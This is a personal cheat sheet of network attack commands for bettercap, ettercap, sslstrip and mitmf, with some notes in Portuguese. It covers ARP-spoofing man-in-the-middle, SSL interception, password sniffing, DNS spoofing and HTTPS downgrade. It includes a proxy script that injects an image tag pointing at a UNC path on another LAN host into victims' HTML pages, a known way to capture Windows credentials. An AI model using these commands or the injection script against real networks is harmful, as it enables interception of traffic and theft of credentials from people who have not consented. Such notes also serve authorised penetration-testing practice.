Bettercap
=======

Source: https://www.cyberpunk.rs/bettercap-usage-examples-overview-custom-setup-caplets

Good manual for bettercap:

https://www.bettercap.org/modules/ethernet/
https://www.bettercap.org/modules/wifi/
https://www.bettercap.org/modules/ble/

https://www.cyberpunk.rs/bettercap-usage-examples-overview-custom-setup-caplets

To bind to a specific interface 
    bettercap -iface tun0



To get help on modules

	help module_name

Activated modules
	
	active
	
to get the value of a variable or parameter
	
	get parameter_name
	
	
The variables of the modules will appear too.

## Mapping the network with bettercap

net.probe on

**OBS: Do not forget to stop the probes, because bettercap continue sending  probes in backgroud **

net.probe off

## man in the middle with bettercap

bettercap -eval "set arp.spoof.targets 192.168.1.5,192.168.1.254"

set arp.spoof.fullduplex true

* if is internal (local network attack)
Set arp.spoof.internal to true. Then all the hosts on the local ethernet will be arp spoofed.

set arp.spoof.internal true
arp.spoof on

![qownnotes-media-sHOjmp](file://media/10589.png)


## SSL sniffing with bettercap

	bettercap -eval "set https.proxy.script http-req-dump.js; https.proxy on; set arp.spoof.targets 192.168.1.254; set arp.spoof.fullduplex true; arp.spoof on"
	
**OBS: With this commands, the bettercap make a new certificate file and then the valid certificate from the site is substituted by the bettercap's certificate. So, if the user is accessing a site tha is using HSTS, we have a problem... hahahahaah shit! See mitmf to view how to bypass (with problems in chrome and firefox new versions)**

## Password Sniffing

For the purpose of example we’ll check some requests from the localhost. Start bettercap (maybe in –debug mode) and set:

	» set net.sniff.filter 'not arp' (default=not arp)
	» set net.sniff.local true
	» set net.sniff.regexp '.*password=.+'
	» set net.sniff.verbose 'true'

You could setup an output file:

	» set net.sniff.output ‘passwords.pcap’

so you can inspect packet dump later on with some tool like WireShark. Alternatively you can use some from the terminal:

	$ tcpdump -qns 0 -X -r dump.pcap
	$ tcpdump -qns 0 -A -r dump.pcap
	$ tshark -r dump.pcap
	$ tcpick -C -yP -r tcp_dump.pcap

## manipulating http traffic

set http.proxy.script /root/img-inject.js
http.proxy on (iptables is used here to make  a redirection to a port like a proxy)
img-inject.js:

	function onLoad() {
		log( "BeefInject loaded." );
		log("targets: " + env['arp.spoof.targets']);
	}
	//function onRequest(req, res) {
	//	if(res.AcceptEncoding.indexOf('Accept-Encoding');
	//}

	function onResponse(req, res) {
		if( res.ContentType.indexOf('text/html') == 0 ){
    var body = res.ReadBody();
    if( body.indexOf('</head>') != -1 ) {
    log( "BeefInject loaded." );
    log("targets: " + env['arp.spoof.targets']);
    res.Body = body.replace( 
    '</head>', 
	   '</head><img src="\\\\192.168.1.253">' 
      ); 
    }
    }
	}


## sniffing the network with bettercap

set net.sniff.local true

net.sniff on

# Ettercap

**OBS: Filtering files is not working. iptables redirections not working as expected. Alternative solution is use BETTERCAP**

arp poisoning with ettercap:

ettercap -T -q -M arp:remote //10.12.24.1// //10.12.24.90//

-T text mode
-q quiet mode
-M type of attack arp:remote for arp poisoning,
icmp redirect, dhcp ...
and then the targets

**OBS: Caso o IPv6 estiver habilitado, a notação para o ataque se torna diferente, conforme exemplo abaixo:**

ettercap -T -q -M arp:remote /10.12.24.1// /10.12.24.90-240//

porque a notação do IPv6 fica da seguinte maneira: MAC/IPs/IPv6/PORTs

## Examples

Here are some examples of using ettercap.

ettercap -Tp

    Use the console interface and do not put the interface in promisc mode. You will see only your traffic.


ettercap -Tzq

    Use the console interface, do not ARP scan the net and be quiet. The packet content will not be displayed, but user and passwords, as well as other messages, will be displayed.


ettercap -T -j /tmp/victims -M arp /10.0.0.1-7/ /10.0.0.10-20/

    Will load the hosts list from /tmp/victims and perform an ARP poisoning attack against the two target. The list will be joined with the target and the resulting list is used for ARP poisoning.


ettercap -T -M arp // //

    Perform the ARP poisoning attack against all the hosts in the LAN. BE CAREFUL !!


ettercap -T -M arp:remote /192.168.1.1/ /192.168.1.2-10/

    Perform the ARP poisoning against the gateway and the host in the lan between 2 and 10. The 'remote' option is needed to be able to sniff the remote traffic the hosts make through the gateway.

ettercap -Tzq //110

    Sniff only the pop3 protocol from every hosts.

ettercap -Tzq /10.0.0.1/21,22,23

    Sniff telnet, ftp and ssh connections to 10.0.0.1.
ettercap -P list

    Prints the list of all available plugins


## SSL Mitm Attack

While performing the SSL mitm attack, ettercap substitutes the real ssl certificate with its own. The fake certificate is created on the fly and all the fields are filled according to the real cert presented by the server. Only the issuer is modified and signed with the private key contained in the 'etter.ssl.crt' file. If you want to use a different private key you have to regenerate this file. To regenerate the cert file use the following commands:

openssl genrsa -out etter.ssl.crt 1024
openssl req -new -key etter.ssl.crt -out tmp.csr
openssl x509 -req -days 1825 -in tmp.csr -signkey etter.ssl.crt -out tmp.new
cat tmp.new >> etter.ssl.crt
rm -f tmp.new tmp.csr

NOTE: SSL mitm is not available (for now) in bridged mode.

NOTE: You can use the --certificate/--private-key long options if you want to specify a different file rather than the etter.ssl.crt file.

### SSLStrip
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

sslstrip -l 8080

echo 1 > /proc/sys/net/ipv4/ip_forward


## DNS spoof attack

First we have to configure the file 

/etc/ettercap/etter.conf

Search for redir_command and uncomment iptables section of redirection

now, we have to configure the file:

/etc/ettercap/etter.dns

ettercap -- etter.dns -- host file for dns_spoof plugin                 
                                                                                                                                                    
 Sample hosts file for dns_spoof plugin                                   
                                                                          
 the format is (for A query):                                             
   www.myhostname.com A 168.11.22.33                                      
   *.foo.com          A 168.44.55.66                                      
                                                                          
 ... for a AAAA query (same hostname allowed):                            
   www.myhostname.com AAAA 2001:db8::1                                    
   *.foo.com          AAAA 2001:db8::2                                    
                                                                          
 or to skip a protocol family (useful with dual-stack):                   
   www.hotmail.com    AAAA ::                                             
   www.yahoo.com      A    0.0.0.0                                        
                                                                          
 or for PTR query:                                                        
   www.bar.com    PTR 10.0.0.10                                           
   www.google.com PTR ::1                                                 
                                                                          
 or for MX query (either IPv4 or IPv6):                                   
    domain.com MX xxx.xxx.xxx.xxx                                         
    domain2.com MX xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx                
    domain3.com MX xxxx:xxxx::y
    or for WINS query:                                                       
    workgroup WINS 127.0.0.1                                              
    PC*       WINS 127.0.0.1                                              
                                                                          
 or for SRV query (either IPv4 or IPv6):                                  
    service._tcp|_udp.domain SRV 192.168.1.10:port                        
    service._tcp|_udp.domain SRV [2001:db8::3]:port                       
                                                                          
 or for TXT query (value must be wrapped in double quotes):               
    google.com TXT "v=spf1 ip4:192.168.0.3/32 ~all"                       
                                                                          
 NOTE: the wildcarded hosts can't be used to poison the PTR requests      
       so if you want to reverse poison you have to specify a plain       
       host. (look at the www.microsoft.com example)                      
                                                                          
 microsoft sucks ;)
 redirect it to www.linux.org

microsoft.com      A   107.170.40.56
*.microsoft.com    A   107.170.40.56
www.microsoft.com  PTR 107.170.40.56       Wildcards in PTR are not allowed

Exemplo de comando:q

	ettercap -Tq -P dns_spoof -M arp:remote /10.12.24.1// /10.12.24.33//
	
# Netsed

Netsed is a tool for manipulating network traffic. (I don't think that this tool can be used for malicious purpose, but i am documenti this for some situation)

# mitmf

source:
https://www.javatpoint.com/bypassing-https

mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.1.254 -i eth0

mitmf already starts ssltrip without specifying any argument